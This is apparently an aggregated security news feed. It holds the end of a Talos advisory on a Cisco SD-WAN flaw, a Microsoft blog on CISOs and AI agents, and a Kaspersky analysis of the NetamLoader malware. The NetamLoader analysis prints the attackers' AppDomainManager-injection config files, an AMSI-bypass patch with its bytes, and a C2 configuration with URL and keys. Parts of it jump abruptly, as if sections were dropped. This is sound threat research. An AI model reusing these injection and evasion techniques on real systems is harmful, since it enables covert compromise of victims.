reference file metadata Network Sniffing T1040 PolyFlame and LittleFilch intercept SD-WAN control-plane traffic Encrypted Channel: Symmetric Cryptography T1573.001 PolyFlame AES implementation; aaamgrd RC4 packer; LittleFilch RSA-encrypted records Recommendations Cisco has released patches for CVE-2026-20127 and published a hardening guide for Cisco Catalyst SD-WAN deployments available here . Organizations are strongly advised to prioritize the application of these patches and follow the guidance provided. Following the identification of UAT-11473 activity, Talos strongly recommends that organizations monitor their systems for indicators of post-compromise activity. Should any signs of unauthorized activity be detected, organizations should immediately activate their incident response frameworks. Contact the Cisco Technical Assistance Center (TAC) for support by initiating a TAC request . Coverage Snort SIDs are already available for CVE-2026-20127: 65938, 65958. items.title: The CISO’s evolving role: Protecting and defending in the agentic era
items.detail: October is Cybersecurity Awareness Month, and it’s a good time to think about how much the world has changed for chief information security officers (CISOs) in the last 12 months. A year ago, we thought we were already in the thick of AI and starting to understand it. Since then, agents have spread across the enterprise faster than most organizations anticipated. According to our Work Trend Index Annual Report , the number of active agents in the Microsoft 365 ecosystem grew 15-fold year over year and 18-fold in large enterprises. Employees are building and deploying AI systems that can access company data, interact with applications, and take actions on their behalf. These systems are built with good intentions, but even well-intentioned agents can introduce risk when access and behavior are not appropriately governed. At the same time, more people inside our companies are building with AI. Many of them haven’t written code in years, if ever, and they aren’t necessarily thinking about security the way a security team would. That isn’t a criticism. It’s how quickly the technology has expanded who can build and what they can accomplish. For CISOs, this creates two fundamental shifts. We have to protect an enterprise that increasingly operates through AI and agents. And we have to rethink how we defend that enterprise as attackers use AI to move faster and operate at greater scale. When I talk with CISOs, these are the two challenges I keep coming back to. We need to enable innovation without introducing unmanaged risk, and we need to modernize defense without losing the security fundamentals that still matter. Get the 2026 Work Trend Index report For builders: Build securely in the agentic era Cybersecurity awareness has always been about people. This year, it has to include the people building agents. If you’re a developer, a builder, or someone who has just realized that AI can help you design and build things, this part is for you. Give your agents their own identities. Where supported and appropriate, assign agents governed identities rather than personal or shared credentials. When something goes wrong, you need to know which agent did it and be able to shut it off. Protect the data your agents touch. If an agent can reach information, assume it will use it. Make sure the right data protections are in place before you connect it. And remember that the agent will not think like you. It doesn’t share your judgment or your sense of what is appropriate. If you give it access to information or systems, it will act on that access, and that can quickly become a problem. Your CISO wants you to build. They also need to know what’s being built, so they can help you do it safely. The best thing you can do for your security leader is to have the identity and data conversation early, before you build, not after. For CISOs: Protect the enterprise as agent adoption grows Your first job is to put guardrails in place so people can innovate carefully, without slowing them down. Good guardrails help teams move faster because they know where the lines are. Start with observability, and make it deep. You need to know which agents exist, who owns them, what they can reach, and what they’re doing. You can’t protect what you can’t see. Deep observability also means knowing when an agent’s behavior changes, so your team can step in before a small issue becomes a big one. Then hold people’s feet to the fire on identity and data. These are the two areas where I wouldn’t give any ground. Every agent needs a governed identity with only the access it needs, and the data it can reach needs to be classified and protected. When those two are in place, most other decisions get easier. Here’s how we’re approaching agent governance . For CISOs: Defending differently Your second job is to defend differently than you have historically done. Attackers are using AI to move faster, and our latest Microsoft Digital Defense Report shows how much that is compressing the time defenders have to respond. But defending differently isn’t simply about adopting faster tools. It’s about changing how security teams turn information into action. The more integrated your environment is, the faster you’ll be able to see an attack and respond to it. An attack rarely shows up in just one place. Signals across identity, endpoints, applications, and cloud environments need to come together with threat intelligence and organizational context so defenders can understand what’s happening and respond before an incident escalates. When your tools work together, your team sees the full picture instead of pieces of it. It also requires a security approach built to continuously assess risk, make decisions, and act at the speed threats are developing. You also need the right threat intelligence and the right partner. Threat intelligence helps organizations understand how threats are changing, which ones matter to their environment, and where to focus their defenses. Working with partners that have visibility across industries and organizations can provide broader context than an individual organization may have on its own. And you’re not going to operate at this speed without agents helping you. The same capabilities that make attacks faster can make defense faster, with agents working alongside your analysts to investigate and respond. That’s why we’re bringing integrated security operations and agentic defense together . Two jobs, one goal The pace of change over the last year has been significant, and it is likely to continue. None of this means slowing down. The CISOs I talk with want their companies to innovate. They need to protect the enterprise as it uses AI and the increasing speed of AI-enabled threats. Prepare for an agent-driven workplace Explore Work Trend Index insights on the changing role of agents at work and the trends shaping how organizations operate. Explore the Work Trend Index If you’re building with AI, bring your security team in early and have the identity and data conversation. If you’re a CISO, focus on those two jobs and make sure you have the right partners for both. To learn more about Microsoft Security solutions, visit our website. Bookmark the Security blog to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ( Microsoft Security ) and X ( @MSFTSecurity ) for the latest news and updates on cybersecurity. items.title: Unknown APT uses NetamLoader to attack a Win10 OS customized for governments in Asia
items.detail: Introduction A couple of months ago, our research revealed a highly sophisticated infection chain and a complex .NET assembly-loading framework built on XAML markup, which strongly indicates a supply-chain attack targeting a custom Windows build used exclusively by government entities in Asia. The malicious framework has been labeled NetamLoader; at present, no attribution to any known APT group has been established. The sample came to light in the first half of 2026, when Kaspersky Security Network (KSN) issued a malware detection alert for a .config file using AppDomainManager injection to load arbitrary .NET assemblies. The file was packaged inside a CAB archive placed in the directory that stores Windows operating system update packages. Initial analysis of the CAB contents found no malicious code: most executables were legitimate components of the third-party patch management tool Patch My PC, and even the .NET assemblies used for the injection were Microsoft-signed. A later re-examination of the original .config file and the full loading process revealed the infection chain and framework described in this report. Kaspersky’s products detect this threat as HEUR:Trojan.MSIL.NetamLoader.gen, Trojan.MSIL.Zapchast.*, and Trojan.Script.Agent.*. Background During routine threat hunting, KSN sent us a malware detection alert. The notification flagged a .config file that employed AppDomainManager injection to load arbitrary .NET assemblies. The file was compressed into a CAB archive named e4537a1762fcafd2fd96bfc825bad34f9db9a24d and saved in the folder that stores Windows operating system update packages. Below is the full path to this archive: C:\Windows\SoftwareDistribution\Download\e4537a1762fcafd2fd96bfc825bad34f9db9a24d Starting with this CAB archive, we uncovered a highly complex infection chain that uses a previously unknown advanced loading framework. Initial infection The CAB file contains the following seven files, which are extracted and placed in the path C:\Windows\SoftwareDistribution\Download\Install\: Files compressed in the CAB file Except for Resources.resx, none of the files contain malicious code. We did not observe how the CAB file was delivered to the victim; we only saw the process PatchMyPC-ScriptRunner.exe running with the following arguments: C:\Windows\SoftwareDistribution\Download\Install\PatchMyPC-ScriptRunner.exe -updatepackage -applicationid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx After the file is launched in this manner, the infection chain progresses to stage 1. Stage 1 Starting with the execution of PatchMyPC-ScriptRunner.exe, which then served as a host process for loading several payloads, we identified a complex two‑stage loading mechanism with multiple steps. The overall flow of stage 1 is summarized in the diagram below. Infection chain: Stage 1 Step 1 The AppDomainManager injection technique is used to load an arbitrary .NET assembly. With this mechanism, when PatchMyPC-ScriptRunner.exe runs, the accompanying configuration file PatchMyPC-ScriptRunner.exe.config in the same directory is loaded before the executable’s main function runs. Below is the content of PatchMyPC‑ScriptRunner.exe.config. <?xml version="1.0" encoding="utf-8" ?> <configuration> <runtime> <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration"> </appDomainManagerType> <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"> </appDomainManagerAssembly> <NGenAssemblyUsageLog enabled="0" /> </runtime> <startup> <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.6" /> </startup> </configuration> According to the configuration file, the class Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration from the Microsoft.HostIntegration.Connectors.dll module (a Microsoft‑signed assembly) is loaded. DataCacheFactoryConfiguration is the configuration class for the Windows Server AppFabric Cache Client, specifying the settings for a new cache client. When the configuration class is loaded, its instance first attempts to find and read the default configuration file, fabric.config, located in the same directory. The contents of fabric.config are shown below: <?xml version="1.0" encoding="utf-8"?> <section name="foo"> <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" /> </section> Step 2 The DataCacheFactoryConfiguration class has a design flaw that can be abused to load arbitrary assemblies. The fabric.config file is meticulously crafted. When the file is loaded, the DataCacheFactoryConfiguration instance examines its className attribute, loads the specified type ( System.Resources.ResXResourceSet from the System.Windows.Forms assembly), and creates a ResXResourceSet instance, passing “Resources.resx” to its constructor for parsing. In the .resx file, multiple layers of payloads – including several XAML files, .NET assemblies, and JSON data – are encoded, compressed, or encrypted (see the diagram below). Each layer is unpacked and loaded by the layer above it. Once a layer finishes its operation, the next layer is extracted and loaded. Below, we analyze each layer in the order in which it is loaded: Multiple layers of payloads are compressed and encrypted in the .resx file The Microsoft RESX schema defines the XML layout used by .resx files, which has a human-readable structure and can hold application resources: strings, images, icons, and serialized objects. The Resources.resx file contains a Base64‑encoded binary object that was serialized using the well‑known, highly vulnerable .NET BinaryFormatter class. Base64-encoded serialized binary object in Resources.resx Parsing this .resx file with ResXResourceSet causes the embedded Base64‑encoded binary payload to invoke BinaryFormatter.Deserialize(), triggering a deserialization vulnerability that enables a TypeConfuseDelegate attack . The TypeConfuseDelegate then invokes XamlReader.Parse() , which loads a XAML payload (named XAML-1) embedded within the binary object. XAML is a markup language for building user interfaces in .NET applications, but its capabilities extend far beyond that. Using two built‑in objects, ObjectDataProvider and ResourceDictionary , logic equivalent to C# code can be expressed in an XML‑like syntax. A code snippet of XAML-1 Step 3 The XAML-1 code acts as a loader for an embedded payload. The process is as follows: Retrieve the full command line of the current host process PatchMyPC‑ScriptRunner.exe, converting all arguments to lowercase. Generate the AES key by hashing the command‑line string with SHA‑256. Decode the Base64 string embedded in XAML-1 into a binary array. Use the first 16 bytes of that array as the IV, then decrypt the remaining encrypted data with AES. The decrypted output is another piece of XAML code, which we refer to as XAML-2. Load XAML-2 into memory using the .NET API System.Windows.Markup.XamlReader.Load() . If any exception occurs during decryption, trigger Environment.Exit(0) , silently terminating the host process to prevent error messages that might reveal the attack. Stage 2 XAML‑2 initiates stage 2 of the infection. The diagram below shows the overall flow of this stage. Infection chain: Stage 2 XAML‑2 contains two embedded Base64‑encoded sections. These sections are actually two additional XAML files (referred to as XAML-2-1 and XAML-2-2) that were first compressed with ZIP and then encoded in Base64. After decoding and decompressing, XAML-2 loads each file into memory separately with XamlReader.Load() . A code snippet of XAML-2 XAML-2-1 The first file consists of 796 lines. Its sole purpose is to hijack a key AMSI API to bypass anti‑malware scanning. Sensitive strings in XAML-2-1 are cut into tiny pieces To avoid detection by anti‑malware signature scans, sensitive strings are split into very short fragments. When XAML-2-1 is loaded and parsed, the fragments are reassembled into the original string. The key steps it takes to achieve its goal are as follows: Check the OS architecture by verifying whether IntPtr.Size equals 8. If it does not, the host process isn’t 64‑bit, so abort the hijack operation. Combine the split strings into a single CLSID GUID (fdb00e52-a214-4aa1-8fba-4357bb0072ec), then try to create an instance of the AMSI COM object using this GUID. Patch the AMSI module. Create a delegate for the runtime method Console.Clear() and then obtain its native function pointer. Next, patch the method by overwriting its first bytes in memory with the binary payload (41 C7 00 01 00 00 00 33 C0 C3). Obtain the native pointer of the AMSI COM object with Marshal.GetIUnknownForObject() . From this pointer, read the address of its virtual method table and add 0x18 to reach another pointer that holds the address of the CAmsiAntimalware::Scan method. Use VirtualProtect() to make the Scan() pointer writable, change its value from the address of the CAmsiAntimalware::Scan() method to the address of the patched Console.Clear() , and then restore the pointer’s original protection attributes. Once this step is complete, every scan returns AMSI_RESULT_CLEAN (value = 0) . One patch targets the Console.Clear() API, which resides in the memory space of an existing legitimate module, while the other modifies only the virtual tables of the AMSI module, allowing the malware to pass code integrity checks. XAML-2-2 XAML-2-2 consists of two parts: a .NET module (the first loader, .NET 1 Loader) and a JSON data payload (the C2 configuration, JSON-1). Both components are compressed with ZIP and then encoded in Base64. XAML-2-2 first decodes and decompresses the .NET assembly .NET 1 Loader, then uses the Assembly.CreateInstance() API to create an instance of the .NET 1 Loader and passes the Base64‑encoded JSON-1 to the m.C() method of .NET 1 Loader as a parameter. .NET 1 Loader .NET 1 Loader decodes, decompresses, and parses JSON‑1. The decoded and decompressed JSON‑1 is shown below: { "p": "[Base64‑encoded JSON, which we call JSON‑1-p]" "c": "[Base64‑encoded JSON, which we call JSON‑1-c]" } JSON-1-c This JSON contains the configuration data that .NET 1 Loader uses to report the execution results of the loaded payload to the C2 server. sc false Flag. Determines whether to report the execution result of m.C() . When set to false, reporting to C2 is skipped. c null Reporting C2 server. The result returned by the m.C() method of .NET 1 Loader is sent to this server. tp null Unknown item, suspected to be a trusted SSL certificate. Thumbprint was used to verify this alleged C2 certificate. e null The AES key that encrypts the JSON result returned by the m.C() method of .NET 1 Loader. JSON-1-p JSON-1-p is a more complex configuration file. .NET 1 Loader parses its data to prepare and load the subsequent stages. The following configuration keys store the payloads: oib : Base64‑encoded .NET 2 Plugin (PE file) oub : Base64‑encoded XAML that invokes Exit(0) ibk : AES key used to decrypt ibi ibi : A Base64‑encoded collection of compressed, encrypted XAML templates used to build XAML-3. Detailed instructions for decrypting and assembling XAML‑3 are provided in the XAML‑3 section below. Other items are passed as C2 configuration to the .NET 2 Plugin at a later stage. [ { "c": [ { "cu": "https://openaigpt4v.com/model_v4/", "tp": "*", "rh": "" } ], "mib": 79200, "mab": 100800, "mis": 1200, "mas": 2400, "e": "9fT04e03tAiZAPogcDWt0w==", "ii": null, "aop": null, "oib": "TVqQAAMAAAAEAAAA//8AALgAAAAAA...", "oub": "PFJlc291cmNlRGljdGlvbmFyeS...", "wi": 100801, "ibk": "W7BHmIRBRY3FOIfWprbW/ZJh5GbPND3sY+qCBDY7O2A=", "ibi": "4pUDtQVbD6leQrDvtT3gaaCLec...", "de": false } ] After obtaining the configuration, .NET 1 Loader proceeds with the following key steps: Delete the update records from the system log related to the malicious update packages, along with the malicious files and cache files used in stage 1. AES encryption scheme for network traffic All traffic between the malware and the C2 server is encrypted and authenticated using AES‑128‑CBC with HMAC. The encryption and authentication keys are derived from a master key – specified in the configuration as "ec"="9fT04e03tAiZAPogcDWt0w==" – by applying HMAC with distinct seed values. For a given master key and a single-byte seed, the derivation works as follows: Generate a 16‑byte sequence from the seed; this serves as the HMAC key. Compute HMAC‑SHA256 over the master key to obtain an intermediate key. Use this intermediate key as the HMAC key to compute HMAC‑SHA256 on the constant byte 0x01. Take the first 16 bytes of the resulting hash; this becomes the final derived key. Accordingly, the server-side encryption and decryption keys mirror those on the client (malware) side. Seed Key type generated (client side) Key type generated (server side) 0 Decryption key Encryption key 1 Decryption authentication key Encryption authentication key 2 Encryption key Decryption key 3 Encryption authentication key Decryption authentication key The code implements an encapsulation of AES-CBC encryption combined with HMAC-SHA256 integrity verification. It uses a randomly generated IV to symmetrically encrypt the plaintext in CBC mode and produces ciphertext. Next, it calculates an SHA256 message authentication code for the concatenated “IV+ciphertext” using a separate HMAC key. Finally, it concatenates the three segments – IV (16 bytes) | ciphertext | HMAC (32 bytes) – into a single byte array that constitutes the final encrypted message. This follows the standard cryptographic Encrypt-then-MAC construction. The receiver must validate the HMAC before decrypting with the corresponding key and IV, which ensures confidentiality, integrity, and tamper resistance. Discovering proxies .NET 2 Plugin detects the system proxy using three methods: Retrieve the system‑wide proxy configuration using the Win32 WinHTTP API function WinHttpGetDefaultProxyConfiguration() , then extract the proxy server with the regular expression (?:([a-zA-Z]+)=)?(.*) . If that fails, locate the running explorer.exe process, impersonate its access token using Impersonate() , and retrieve its proxy configuration with the .NET API WebProxy.GetDefaultProxy() . If both methods fail, fall back to obtaining the proxy from the .NET property DefaultWebProxy . These methods ensure that the malware can reach external networks even in complex network environments with proxies. Execute downloaded XAML payload in an isolated AppDomain This technique abuses MulticastDelegate again by using reflection to modify its private _invocationList array. .NET 2 Plugin creates a multicast delegate ( CrossAppDomainDelegate ) and replaces one entry in its invocation list with a malicious delegate pointing to XamlReader.Parse() . When AppDomain.DoCallBack() executes this multicast delegate, it iterates through the invocation list and invokes the injected XamlReader.Parse() to parse and execute the downloaded XAML. In more detail, the process is as follows: Create a new isolated AppDomain with a randomly generated GUID as its name. Copy all configuration data from the current AppDomain into the new one. Set the proxy information in the new AppDomain and assign it to the variable px . Use TypeConfuseDelegate to replace TimeZoneInfo.ClearCachedData() with XamlReader.Parse() , thereby modifying the MulticastDelegate(CrossAppDomainDelegate) . Use appDomain.DoCallBack() to invoke XamlReader.Parse() within the isolated AppDomain, executing the downloaded XAML payload. Transfer any updated configuration data from the new AppDomain back to the original AppDomain. Unload the isolated AppDomain to complete the cleanup. This technique keeps the downloaded malicious payload out of the main AppDomain, which increases stability and allows the payload to be fully cleaned up after execution. Consequently, we infer that the victims are Asian government entities. Attribution After analyzing the TTPs, code similarities, and infrastructure, we were unable to link the attack to any known APT group. Conclusions Technological sovereignty has become a global trend. In today’s geopolitical climate, a growing number of countries are building their own core software platforms, including operating systems, databases, middleware, and cloud services, with operating systems often the top priority. The advantage is that each country controls the development, operation, and upgrading of its own operating systems, granting it full autonomy over the entire process. On the other hand, it also means that each country must protect this entire vast ecosystem on its own. Bringing the operation and maintenance of such a system to maturity is a lengthy process. Until then, both the system and its emerging supply chain could be exposed to attacks through multiple vectors, increasing potential vulnerabilities.
